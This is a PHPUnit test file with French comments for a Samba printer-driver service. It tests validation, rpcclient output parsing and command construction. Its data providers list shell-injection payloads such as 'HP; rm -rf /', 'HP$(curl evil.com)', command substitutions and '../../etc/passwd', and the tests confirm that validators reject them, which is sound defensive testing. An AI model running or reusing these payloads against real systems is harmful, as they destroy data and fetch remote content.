<?php

declare(strict_types=1);

namespace Tests\Unit\Services\Print;

use App\Services\Print\Exceptions\KerberosTicketException;
use App\Services\Print\Exceptions\PrintDriverException;
use App\Services\Print\Exceptions\WindowsPivotUnreachableException;
use App\Services\Print\PrintDriverService;
use InvalidArgumentException;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use Tests\Support\FakeCommandRunner;
use Tests\TestCase;

/**
 * Story 6.2 — Tests Unit du Service PrintDriverService.
 *
 * Couvre :
 *  - Validation regex (driver name / hostname pivot / architecture / file name),
 *    AC9 defense in depth.
 *  - Parsing `rpcclient enumdrivers` (legacy printers.inc.php:478).
 *  - Parsing `rpcclient getdriver` (legacy printers.inc.php:47-58) avec
 *    cas spécial `(null)` → `"NULL"` string littéral, et Dependentfiles multi.
 *  - Parsing `rpcclient enumprinters` (legacy printers.inc.php:572-583).
 *  - Parsing `rpcclient getprinter` (legacy printers.inc.php:540-553).
 *  - Format strict `adddriver "Windows x64" "<name>:<path>:<datafile>:<configfile>:<helpfile>:NULL:NULL:<deps>" "3"`.
 *  - `escapeshellarg()` sur les arguments user-controlled (printer / driver
 *    / pivot / file).
 *  - Mapping erreurs : KerberosTicketException, WindowsPivotUnreachableException,
 *    SambaUnavailableException, PrintDriverException.
 *  - 3 data-providers sécurité (driver_name / pivot_hostname / file_name)
 *    avec ≥ 8 payloads malicieux chacun.
 *
 * Pas de DB / Eloquent ici — shellout pur (cf. CupsPrinterServiceTest 6.1).
 */
class PrintDriverServiceTest extends TestCase
{
    private FakeCommandRunner $runner;
    private PrintDriverService $service;

    protected function setUp(): void
    {
        parent::setUp();
        config(['sambaedu.se4fs_name' => 'se4fs']);
        $this->runner = new FakeCommandRunner();
        $this->service = new PrintDriverService($this->runner);
    }

    private function fixture(string $name): string
    {
        return base_path('tests/fixtures/samba/' . $name);
    }

    // ========================================================================
    // VALIDATION (AC9)
    // ========================================================================

    #[Test]
    public function it_accepts_valid_driver_names(): void
    {
        $this->service->validateDriverName('Generic / Generic PostScript Printer');
        $this->service->validateDriverName('HP LaserJet 4000 PCL');
        $this->service->validateDriverName('Brother HL-L2350DW series');
        $this->service->validateDriverName('A');
        $this->expectNotToPerformAssertions();
    }

    #[Test]
    #[DataProvider('maliciousDriverNamePayloads')]
    public function register_driver_rejects_malicious_driver_name(string $payload): void
    {
        $this->expectException(InvalidArgumentException::class);
        $this->service->validateDriverName($payload);
    }

    public static function maliciousDriverNamePayloads(): array
    {
        return [
            'empty' => [''],
            'too_long' => [str_repeat('A', 256)],
            'semicolon_inject' => ['HP; rm -rf /'],
            'pipe' => ['HP|wc'],
            'amp' => ['HP&id'],
            'backtick' => ['HP`id`'],
            'dollar_paren' => ['HP$(curl evil.com)'],
            'null_byte' => ["HP\0rm"],
            'newline_inject' => ["HP\nrm"],
            'redirect' => ['HP>file'],
            'path_traversal' => ['../../etc/passwd'],
            'unc_inject' => ['\\\\evil\\share'],
            'angle' => ['HP<x>'],
            'tab' => ["HP\tx"],
            // Fix #19 — payloads sécurité supplémentaires.
            'unicode_fullwidth_solidus' => ["HP\xEF\xBC\x8Ftest"], // U+FF0F
            'crlf_combined' => ["HP\r\nrm"],
            'url_encoded_null' => ['HP%00rm'],
            'homoglyph_cyrillic' => ["\xD0\x9D\xD0\xA0"], // Н + Р cyrilliques
        ];
    }

    #[Test]
    public function it_accepts_valid_pivot_hostnames(): void
    {
        $this->service->validatePivotHostname('w10pivot');
        $this->service->validatePivotHostname('W10-PIVOT-1');
        $this->service->validatePivotHostname('a');
        $this->service->validatePivotHostname('AAAAAAAAAAAAAAA'); // 15
        $this->expectNotToPerformAssertions();
    }

    #[Test]
    #[DataProvider('maliciousPivotHostnamePayloads')]
    public function register_driver_rejects_malicious_pivot_hostname(string $payload): void
    {
        $this->expectException(InvalidArgumentException::class);
        $this->service->validatePivotHostname($payload);
    }

    public static function maliciousPivotHostnamePayloads(): array
    {
        return [
            'empty' => [''],
            'too_long' => [str_repeat('a', 16)],
            'leading_dash' => ['-w10'],
            'space' => ['w10 pivot'],
            'semicolon' => ['w10;rm'],
            'backtick' => ['w10`id`'],
            'dollar_paren' => ['w10$(id)'],
            'pipe' => ['w10|wc'],
            'newline' => ["w10\nrm"],
            'null_byte' => ["w10\0rm"],
            'unc' => ['\\\\evil'],
            'underscore_invalid' => ['w10_pivot'],
            // Fix #19 — payloads sécurité supplémentaires.
            'unicode_fullwidth_solidus' => ["w10\xEF\xBC\x8F"],
            'crlf_combined' => ["w10\r\nrm"],
            'homoglyph_cyrillic' => ["\xD0\xA1\xD0\x95"], // С + Е cyrilliques
        ];
    }

    // ========================================================================
    // validateCupsName — distinct de validatePivotHostname (Fix #1)
    // ========================================================================

    #[Test]
    public function validate_cups_name_accepts_underscore_in_printer_names(): void
    {
        // Fix #1 — les noms d'imprimantes CUPS autorisent l'underscore
        // (cohérent CupsPrinterService::NAME_REGEX 6.1), contrairement
        // au strict NetBIOS du HOSTNAME_REGEX.
        $this->service->validateCupsName('imp_mine');
        $this->service->validateCupsName('imp_other');
        $this->service->validateCupsName('imp-salle-a');
        $this->service->validateCupsName('imp1');
        $this->expectNotToPerformAssertions();
    }

    #[Test]
    public function validate_cups_name_rejects_invalid_chars(): void
    {
        $this->expectException(InvalidArgumentException::class);
        $this->service->validateCupsName('imp space');
    }

    #[Test]
    public function validate_cups_name_rejects_too_long(): void
    {
        $this->expectException(InvalidArgumentException::class);
        $this->service->validateCupsName(str_repeat('a', 16));
    }

    #[Test]
    public function get_driver_for_printer_accepts_underscore_cups_name(): void
    {
        // Fix #1 — régression : getprinter pour `imp_mine` ne doit pas
        // lever InvalidArgumentException sur la validation de nom.
        $this->runner->whenContains('getprinter "imp_mine"', '', 1, 'WERR_INVALID_PRINTER_NAME');
        // Pas d'exception attendue (le getprinter retourne null sur WERR_INVALID_PRINTER_NAME).
        $result = $this->service->getDriverForPrinter('imp_mine');
        $this->assertNull($result);
    }

    #[Test]
    public function it_accepts_x64_architecture_only(): void
    {
        $this->service->validateArchitecture('x64');
        $this->expectNotToPerformAssertions();
    }

    #[Test]
    public function it_rejects_unsupported_architecture(): void
    {
        $this->expectException(InvalidArgumentException::class);
        $this->service->validateArchitecture('x86');
    }

    #[Test]
    public function it_accepts_valid_file_names(): void
    {
        $this->service->validateFileName('pscript5.dll');
        $this->service->validateFileName('PSCRIPT.PPD');
        $this->service->validateFileName('ps5ui.dll');
        $this->service->validateFileName('pscript.hlp');
        $this->expectNotToPerformAssertions();
    }

    #[Test]
    #[DataProvider('maliciousFileNamePayloads')]
    public function copy_driver_file_rejects_malicious_file_name(string $payload): void
    {
        $this->expectException(InvalidArgumentException::class);
        $this->service->validateFileName($payload);
    }

    public static function maliciousFileNamePayloads(): array
    {
        return [
            'empty' => [''],
            'too_long' => [str_repeat('a', 256) . '.dll'],
            'path_traversal' => ['../../etc/passwd'],
            'path_traversal_root' => ['/etc/passwd'],
            'absolute_unc' => ['\\\\evil\\share\\file.dll'],
            'null_byte' => ["evil\0.dll"],
            'newline' => ["evil\n.dll"],
            'semicolon' => ['evil;.dll'],
            'backtick' => ['evil`id`.dll'],
            'dollar_paren' => ['evil$(id).dll'],
            'spaces' => ['evil .dll'],
            'parens' => ['evil(x).dll'],
            'slash' => ['sub/evil.dll'],
        ];
    }

    // ========================================================================
    // SANTÉ
    // ========================================================================

    #[Test]
    public function is_samba_healthy_returns_true_on_srvinfo_rc_0(): void
    {
        $this->runner->whenContains('srvinfo', 'srvinfo ok');
        $this->assertTrue($this->service->isSambaHealthy());
    }

    #[Test]
    public function is_samba_healthy_returns_false_on_kerberos_failure(): void
    {
        $this->runner->whenContains('srvinfo', '', 1, 'KRB5_KT_NOTFOUND: cannot find keytab');
        $this->assertFalse($this->service->isSambaHealthy());
    }

    #[Test]
    public function is_samba_healthy_returns_false_on_rpcclient_failure(): void
    {
        $this->runner->whenContains('srvinfo', '', 1, 'NT_STATUS_PIPE_NOT_AVAILABLE');
        $this->assertFalse($this->service->isSambaHealthy());
    }

    #[Test]
    public function is_pivot_reachable_returns_false_on_smbclient_fail(): void
    {
        $this->runner->whenContains('smbclient -L', '', 1, 'Connection to W10PIVOT failed');
        $this->assertFalse($this->service->isPivotReachable('W10PIVOT'));
    }

    // ========================================================================
    // LECTURE
    // ========================================================================

    #[Test]
    public function list_all_drivers_parses_enumdrivers_output_into_typed_array(): void
    {
        $this->runner->whenContainsFromFixture('enumdrivers', $this->fixture('rpcclient-enumdrivers.txt'));

        $drivers = $this->service->listAllDrivers();

        $this->assertCount(4, $drivers);
        $names = array_column($drivers, 'driver_name');
        $this->assertContains('Generic / Generic PostScript Printer', $names);
        $this->assertContains('HP Universal Printing PCL 6', $names);
        $this->assertSame('x64', $drivers[0]['architecture']);
    }

    #[Test]
    public function get_driver_definition_parses_getdriver_output_including_dependent_files(): void
    {
        $this->runner->whenContainsFromFixture(
            'getdriver "Generic PostScript Printer"',
            $this->fixture('rpcclient-getdriver-Generic.txt'),
        );

        $def = $this->service->getDriverDefinition('w10pivot', 'Generic PostScript Printer');

        $this->assertSame('Generic / Generic PostScript Printer', $def['Driver Name']);
        $this->assertSame('pscript5.dll', $def['Driver Path']);
        $this->assertSame('PSCRIPT.PPD', $def['Datafile']);
        $this->assertSame('ps5ui.dll', $def['Configfile']);
        $this->assertSame('pscript.hlp', $def['Helpfile']);
        $this->assertSame('Windows x64', $def['Architecture']);
        $this->assertCount(3, $def['Dependentfiles']);
        $this->assertContains('pscript5.dll', $def['Dependentfiles']);
    }

    #[Test]
    public function get_driver_definition_converts_null_field_to_NULL_literal(): void
    {
        // (null) → "NULL" string (compat adddriver legacy l. 111)
        $output = "[Windows x64]\nPrinter Driver Info 3:\n"
            . "\tDriver Name: [Custom Driver]\n"
            . "\tArchitecture: [Windows x64]\n"
            . "\tDriver Path: [\\\\se4fs\\print\$\\x64\\3\\driver.dll]\n"
            . "\tDatafile: [(null)]\n"
            . "\tConfigfile: [(null)]\n"
            . "\tHelpfile: [(null)]\n";
        $this->runner->whenContains('getdriver "Custom Driver"', $output);

        $def = $this->service->getDriverDefinition('w10pivot', 'Custom Driver');

        $this->assertSame('Custom Driver', $def['Driver Name']);
        $this->assertSame('driver.dll', $def['Driver Path']);
        $this->assertSame('NULL', $def['Datafile']);
        $this->assertSame('NULL', $def['Configfile']);
        $this->assertSame('NULL', $def['Helpfile']);
    }

    #[Test]
    public function list_printers_on_pivot_parses_enumprinters_output(): void
    {
        $this->runner->whenContainsFromFixture(
            'enumprinters',
            $this->fixture('rpcclient-enumprinters-pivot.txt'),
        );

        $printers = $this->service->listPrintersOnPivot('w10pivot');

        $this->assertCount(2, $printers);
        $this->assertSame('Generic PS', $printers[0]['smb_name']);
        $this->assertSame('Generic / Generic PostScript Printer', $printers[0]['smb_driver']);
    }

    #[Test]
    public function get_driver_for_printer_parses_getprinter_output(): void
    {
        $this->runner->whenContainsFromFixture(
            'getprinter "cups-pdf"',
            $this->fixture('rpcclient-getprinter-cups-pdf.txt'),
        );

        $result = $this->service->getDriverForPrinter('cups-pdf');

        $this->assertNotNull($result);
        $this->assertSame('cups-pdf', $result['smb_name']);
        $this->assertSame('Generic / Generic PostScript Printer', $result['smb_driver']);
    }

    // ========================================================================
    // MUTATIONS
    // ========================================================================

    #[Test]
    public function copy_driver_file_executes_smbclient_get_then_chown_with_escaped_arguments(): void
    {
        $this->runner->setDefault(0);

        $this->service->copyDriverFile('w10pivot', 'pscript5.dll');

        $cmds = $this->runner->executed;
        $smb = collect($cmds)->first(fn($c) => str_contains($c, 'smbclient'));
        $chown = collect($cmds)->first(fn($c) => str_contains($c, 'chown'));

        $this->assertNotNull($smb);
        $this->assertNotNull($chown);
        $this->assertStringContainsString('--use-kerberos=required', $smb);
        $this->assertStringContainsString("'//w10pivot/print\$'", $smb);
        $this->assertStringContainsString('pscript5.dll', $smb);
        $this->assertStringContainsString('cd x64', $smb);
        $this->assertStringContainsString("'/var/lib/samba/printers/x64/pscript5.dll'", $chown);
        $this->assertStringContainsString('www-admin:www-admin', $chown);
    }

    #[Test]
    public function register_driver_executes_adddriver_with_proper_format(): void
    {
        $this->runner->setDefault(0);

        $this->service->registerDriver([
            'Driver Name' => 'Generic / Generic PostScript Printer',
            'Driver Path' => 'pscript5.dll',
            'Datafile' => 'PSCRIPT.PPD',
            'Configfile' => 'ps5ui.dll',
            'Helpfile' => 'pscript.hlp',
            'Dependentfiles' => ['ps5ui.dll', 'pscript5.dll', 'PSCRIPT.PPD'],
            'Architecture' => 'Windows x64',
        ]);

        $cmd = $this->runner->lastCommand();
        $this->assertNotNull($cmd);
        $this->assertStringContainsString('rpcclient', $cmd);
        $this->assertStringContainsString('--use-kerberos=required', $cmd);
        // Format strict legacy l. 110-112 :
        $this->assertStringContainsString('adddriver', $cmd);
        $this->assertStringContainsString('Windows x64', $cmd);
        $this->assertStringContainsString(':NULL:NULL:', $cmd);
        $this->assertStringContainsString('Generic / Generic PostScript Printer:pscript5.dll:PSCRIPT.PPD:ps5ui.dll:pscript.hlp', $cmd);
        $this->assertStringContainsString('"3"', $cmd);
        // Dependentfiles CSV
        $this->assertStringContainsString('ps5ui.dll,pscript5.dll,PSCRIPT.PPD', $cmd);
    }

    #[Test]
    public function register_driver_logs_error_and_throws_print_driver_exception_on_rpcclient_failure(): void
    {
        $this->runner->whenContains('adddriver', '', 1, 'WERR_INVALID_LEVEL');

        try {
            $this->service->registerDriver([
                'Driver Name' => 'Failing Driver',
                'Driver Path' => 'fail.dll',
                'Datafile' => 'FAIL.PPD',
                'Configfile' => 'NULL',
                'Helpfile' => 'NULL',
                'Dependentfiles' => [],
                'Architecture' => 'Windows x64',
            ]);
            $this->fail('Expected PrintDriverException');
        } catch (PrintDriverException $e) {
            $this->assertSame(1, $e->getReturnCode());
            $this->assertStringContainsString('WERR_INVALID_LEVEL', $e->firstStderrLine());
            $this->assertStringContainsString('adddriver', $e->getCommand());
        }
    }

    #[Test]
    public function attach_driver_to_printer_executes_setdriver_with_escaped_arguments(): void
    {
        $this->runner->setDefault(0);
        $this->service->attachDriverToPrinter('cups-pdf', 'Generic / Generic PostScript Printer');

        $cmd = $this->runner->lastCommand();
        $this->assertNotNull($cmd);
        $this->assertStringContainsString('rpcclient', $cmd);
        $this->assertStringContainsString('setdriver "cups-pdf"', $cmd);
        $this->assertStringContainsString('"Generic / Generic PostScript Printer"', $cmd);
        $this->assertStringContainsString('--use-kerberos=required', $cmd);
    }

    #[Test]
    public function detach_driver_from_printer_executes_setdriver_with_empty_string(): void
    {
        $this->runner->setDefault(0);
        $this->service->detachDriverFromPrinter('cups-pdf');

        $cmd = $this->runner->lastCommand();
        $this->assertNotNull($cmd);
        $this->assertStringContainsString('setdriver "cups-pdf" ""', $cmd);
    }

    #[Test]
    public function delete_driver_executes_deldriver_then_unlinks_files(): void
    {
        $this->runner->setDefault(0);

        $this->service->deleteDriver('Generic / Generic PostScript Printer', 'x64', [
            'pscript5.dll', 'PSCRIPT.PPD', 'ps5ui.dll',
        ]);

        $cmds = $this->runner->executed;
        $deldriver = collect($cmds)->first(fn($c) => str_contains($c, 'deldriver'));
        $this->assertNotNull($deldriver);

        $rmCmds = collect($cmds)->filter(fn($c) => str_starts_with($c, 'sudo /bin/rm '));
        $this->assertCount(3, $rmCmds, 'Devrait avoir 3 rm pour 3 fichiers');
        // path-restricted strict /var/lib/samba/printers/x64/
        foreach ($rmCmds as $r) {
            $this->assertStringContainsString("'/var/lib/samba/printers/x64/", $r);
        }
    }

    #[Test]
    public function delete_driver_does_not_unlink_if_deldriver_failed(): void
    {
        $this->runner->whenContains('deldriver', '', 1, 'WERR_UNKNOWN_PRINTER_DRIVER');

        try {
            $this->service->deleteDriver('Inexistant', 'x64', ['foo.dll']);
            $this->fail('Expected PrintDriverException');
        } catch (PrintDriverException $e) {
            $this->assertSame(1, $e->getReturnCode());
        }

        // Aucun `sudo /bin/rm` ne doit avoir été tenté.
        $rm = collect($this->runner->executed)->first(fn($c) => str_starts_with($c, 'sudo /bin/rm '));
        $this->assertNull($rm, 'Aucun unlink ne doit être lancé si deldriver fail');
    }

    // ========================================================================
    // MAPPING ERREURS
    // ========================================================================

    #[Test]
    public function rpcclient_kerberos_failure_throws_kerberos_ticket_exception(): void
    {
        $this->runner->whenContains('enumdrivers', '', 1, 'KRB5_KT_NOTFOUND: no credentials cache');

        $this->expectException(KerberosTicketException::class);
        $this->service->listAllDrivers();
    }

    #[Test]
    public function smbclient_pivot_unreachable_throws_windows_pivot_unreachable_exception(): void
    {
        $this->runner->whenContains('smbclient', '', 1, 'NT_STATUS_HOST_UNREACHABLE');

        $this->expectException(WindowsPivotUnreachableException::class);
        $this->service->copyDriverFile('w10pivot', 'pscript5.dll');
    }

    #[Test]
    public function get_driver_for_printer_returns_null_when_printer_missing(): void
    {
        $this->runner->whenContains('getprinter', '', 1, 'WERR_INVALID_PRINTER_NAME');
        $result = $this->service->getDriverForPrinter('cups-missing');
        $this->assertNull($result);
    }

    #[Test]
    public function rpcclient_command_includes_kerberos_required_flag(): void
    {
        $this->runner->whenContains('srvinfo', 'ok');
        $this->service->isSambaHealthy();
        $cmd = $this->runner->lastCommand();
        $this->assertNotNull($cmd);
        $this->assertStringContainsString('--use-kerberos=required', $cmd);
    }

    #[Test]
    public function kerberos_no_logon_servers_throws_kerberos_ticket_exception(): void
    {
        // Fix #4 — `NT_STATUS_NO_LOGON_SERVERS` est une variante CIFS-side
        // d'un KDC injoignable, doit déclencher `KerberosTicketException`
        // (pas `PrintDriverException` générique).
        $this->runner->whenContains('enumdrivers', '', 1, 'NT_STATUS_NO_LOGON_SERVERS');

        $this->expectException(KerberosTicketException::class);
        $this->service->listAllDrivers();
    }

    #[Test]
    public function get_driver_definition_handles_path_without_unc_prefix(): void
    {
        // Fix #17 — le legacy autorise les valeurs `Datafile: [PSCRIPT.PPD]`
        // sans préfixe UNC `\\se4fs\print$\x64\3\`. Le regex
        // `(.*\\\\3\\\\)?` rend le préfixe optionnel.
        $output = "[Windows x64]\nPrinter Driver Info 3:\n"
            . "\tDriver Name: [Bare Driver]\n"
            . "\tArchitecture: [Windows x64]\n"
            . "\tDriver Path: [driver.dll]\n"
            . "\tDatafile: [PSCRIPT.PPD]\n"
            . "\tConfigfile: [ps5ui.dll]\n"
            . "\tHelpfile: [pscript.hlp]\n";
        $this->runner->whenContains('getdriver "Bare Driver"', $output);

        $def = $this->service->getDriverDefinition('w10pivot', 'Bare Driver');

        $this->assertSame('Bare Driver', $def['Driver Name']);
        $this->assertSame('driver.dll', $def['Driver Path']);
        $this->assertSame('PSCRIPT.PPD', $def['Datafile']);
        $this->assertSame('ps5ui.dll', $def['Configfile']);
        $this->assertSame('pscript.hlp', $def['Helpfile']);
    }

    #[Test]
    public function get_driver_for_printer_uses_non_greedy_split(): void
    {
        // Fix #13 — split non-greedy sur exactement 3 champs séparés par
        // virgule. Une ligne avec 4 virgules (driver_name contient
        // `Acme, Inc`) ne devrait PAS être mal parsée en gobant la
        // virgule dans smb_name (bug greedy).
        $output = "\tdescription:[cups-pdf,Acme, Inc Printer,Commentary]\n";
        $this->runner->whenContains('getprinter "cups-pdf"', $output);

        $result = $this->service->getDriverForPrinter('cups-pdf');
        // 4 commas → no clean 3-field match → null (cohérent legacy : le
        // legacy non plus ne parse pas les virgules dans les champs).
        $this->assertNull($result);
    }
}
